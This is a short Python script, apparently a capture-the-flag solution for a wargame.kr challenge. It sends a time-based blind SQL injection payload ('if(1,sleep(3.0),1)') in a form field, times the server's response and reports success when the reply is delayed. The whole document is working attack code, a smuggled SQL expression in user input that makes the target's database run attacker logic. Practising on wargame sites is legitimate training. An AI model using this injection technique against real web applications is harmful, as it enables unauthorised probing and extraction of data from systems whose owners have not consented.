from requests import *
from time import *
s=session()
data={'mail':'1','cont':'1','type':'if(1,sleep(3.0),1)'}
url='http://wargame.kr:8080/qna/?page=to_jsmaster'
start=time()
response=post(url=url,data=data)
end=time()
if end-start > 3:
    print('sql injection success!')